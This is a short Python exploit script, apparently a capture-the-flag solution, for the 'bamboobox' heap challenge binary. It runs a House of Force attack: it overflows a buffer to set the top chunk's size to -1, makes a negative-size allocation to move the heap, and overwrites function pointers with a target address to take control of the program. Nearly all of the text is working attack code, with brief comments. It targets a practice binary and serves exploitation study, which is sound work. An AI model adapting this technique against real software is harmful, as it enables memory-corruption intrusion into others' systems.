#!/usr/bin/env python
# -*- coding: utf-8 -*-

from roppy import *

r = process('./bamboobox')

def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
# we must alloc enough size, so as to successfully alloc from fake topchunk
additem(0x30, "ddaa")  # idx 0
payload = 0x30 * b'a'  # idx 0's content
payload += b'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
# modify topchunk's size to -1
modify(0, 0x41, payload)
# top chunk's offset to heap base
offset_to_heap_base = -(0x40 + 0x20)
malloc_size = offset_to_heap_base - 0x8 - 0xf
#gdb.attach(r)
pause()
additem(malloc_size, "dada")
pause()
additem(0x10, p64(magic) * 2)
r.interactive()
